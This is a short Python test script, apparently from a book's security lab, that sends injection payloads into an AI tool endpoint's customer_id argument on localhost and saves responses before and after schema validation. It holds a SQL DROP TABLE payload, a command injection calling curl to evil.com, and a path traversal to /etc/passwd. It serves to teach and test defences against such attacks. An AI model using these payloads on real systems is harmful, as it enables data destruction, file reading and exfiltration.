#!/usr/bin/env python3
"""Attack 3: Classic injection through tool args — SQL, command, path (Chapter 9)."""
import requests, json, sys
BASE   = "http://localhost:8000"
label  = sys.argv[1] if len(sys.argv) > 1 else "before"
PAYLOADS = [
    "'; DROP TABLE customers; --",   # SQL
    "$(curl evil.com/exfil)",        # command injection
    "../../../../etc/passwd",        # path traversal
]
results = []
for p in PAYLOADS:
    r = requests.post(f"{BASE}/tools/lookup_customer", json={"customer_id": p})
    results.append({"payload": p, "status": r.status_code, "response": r.json()})
    print(r.status_code, p[:60])
with open(f"evidence/03-{label}.json", "w") as f: json.dump(results, f, indent=2)
# Baseline: SQL fires (string-interpolated query).
# Guarded:  400 from JSON Schema pattern regex.
